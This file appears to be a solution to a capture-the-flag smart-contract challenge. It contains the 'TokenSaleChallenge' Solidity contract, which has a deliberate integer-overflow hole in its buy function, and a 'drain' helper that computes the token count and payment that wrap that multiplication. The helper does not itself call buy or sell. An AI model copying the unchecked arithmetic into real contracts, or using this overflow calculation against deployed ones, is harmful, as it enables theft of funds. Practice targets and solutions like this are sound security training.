pragma solidity ^0.4.21;

contract TokenSaleChallenge {
    mapping(address => uint256) public balanceOf;
    uint256 constant PRICE_PER_TOKEN = 1 ether;

    function TokenSaleChallenge(address _player) public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance < 1 ether;
    }

    function buy(uint256 numTokens) public payable {
        require(msg.value == numTokens * PRICE_PER_TOKEN);

        balanceOf[msg.sender] += numTokens;
    }

    function sell(uint256 numTokens) public {
        require(balanceOf[msg.sender] >= numTokens);

        balanceOf[msg.sender] -= numTokens;
        msg.sender.transfer(numTokens * PRICE_PER_TOKEN);
    }
}

contract drain {
    TokenSaleChallenge tsc;

    constructor(address conAddress) public {
      tsc = TokenSaleChallenge(conAddress);
    }

    function overflow() public pure returns (uint256 amount, uint256 tokens) {
        uint256 max = 2**256-1;                 // Max value possible held in uint256
        uint256 denom = 10**18;                 // 1 ether == 10^18 wei
        uint256 buyTokens = (max / denom) + 1;  // calculate # of tokens to buy
        uint256 over = buyTokens * denom % max; // calculate value to send
        return (over, buyTokens);
    }

    function receive() external payable {

    }
}
